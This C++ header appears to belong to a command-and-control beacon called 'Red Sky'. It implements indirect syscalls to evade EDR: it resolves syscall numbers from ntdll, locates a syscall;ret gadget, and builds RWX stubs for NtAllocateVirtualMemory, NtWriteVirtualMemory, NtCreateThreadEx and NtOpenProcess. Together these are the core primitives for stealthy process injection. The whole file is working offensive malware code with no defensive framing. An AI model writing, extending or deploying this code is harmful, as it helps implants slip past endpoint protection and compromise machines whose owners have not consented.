// language: C++, file: syscalls.hpp, target: Red Sky beacon — indirect syscalls
// Resolves SSNs from ntdll, allocates RWX stubs that jump to a clean syscall;ret
// gadget in ntdll. Defeats usermode EDR hooks on NT functions.

#pragma once
#include <windows.h>
#include <cstring>
#include <cstdint>

namespace rs { namespace sc {

// hash of NtXxx name → stub address
inline void* find_gadget() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return nullptr;
    auto dos = (IMAGE_DOS_HEADER*)ntdll;
    auto nt  = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE* start = (BYTE*)ntdll + sec->VirtualAddress;
        BYTE* end   = start + sec->Misc.VirtualSize;
        for (BYTE* p = start; p < end - 3; ++p) {
            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                return p;  // syscall; ret
        }
    }
    return nullptr;
}

inline DWORD resolve_ssn(const char* name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0xFFFFFFFF;
    auto dos = (IMAGE_DOS_HEADER*)ntdll;
    auto nt  = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dos->e_lfanew);
    auto exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto names = (DWORD*)((BYTE*)ntdll + exp->AddressOfNames);
    auto funcs = (DWORD*)((BYTE*)ntdll + exp->AddressOfFunctions);
    auto ords  = (WORD*)((BYTE*)ntdll + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* fn = (const char*)((BYTE*)ntdll + names[i]);
        if (strcmp(fn, name) != 0) continue;
        BYTE* stub = (BYTE*)ntdll + funcs[ords[i]];
        for (int j = 0; j < 32; ++j) {
            if (stub[j] == 0xB8) {
                DWORD ssn = *(DWORD*)(stub + j + 1);
                if (ssn < 0x2000) return ssn;
            }
        }
    }
    return 0xFFFFFFFF;
}

inline void* build_stub(DWORD ssn, void* gadget) {
    BYTE* mem = (BYTE*)VirtualAlloc(nullptr, 32, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return nullptr;
    BYTE code[] = {
        0x4C, 0x8B, 0xD1,                          // mov r10, rcx
        0xB8, 0, 0, 0, 0,                          // mov eax, ssn
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,        // jmp [rip+0]
        0,0,0,0,0,0,0,0                            // gadget
    };
    *(DWORD*)(code + 4) = ssn;
    *(void**)(code + 16) = gadget;
    memcpy(mem, code, sizeof(code));
    return mem;
}

// resolve once at startup
struct State {
    void* gadget = nullptr;
    void* NtAllocateVirtualMemory = nullptr;
    void* NtProtectVirtualMemory  = nullptr;
    void* NtWriteVirtualMemory    = nullptr;
    void* NtCreateThreadEx        = nullptr;
    void* NtOpenProcess           = nullptr;
    void* NtClose                 = nullptr;
};

inline State& state() {
    static State s;
    return s;
}

inline void init() {
    auto& s = state();
    s.gadget = find_gadget();
    if (!s.gadget) return;
    auto mk = [&](const char* n) -> void* {
        DWORD ssn = resolve_ssn(n);
        if (ssn == 0xFFFFFFFF) return nullptr;
        return build_stub(ssn, s.gadget);
    };
    s.NtAllocateVirtualMemory = mk("NtAllocateVirtualMemory");
    s.NtProtectVirtualMemory  = mk("NtProtectVirtualMemory");
    s.NtWriteVirtualMemory    = mk("NtWriteVirtualMemory");
    s.NtCreateThreadEx        = mk("NtCreateThreadEx");
    s.NtOpenProcess           = mk("NtOpenProcess");
    s.NtClose                 = mk("NtClose");
}

}} // namespace rs::sc
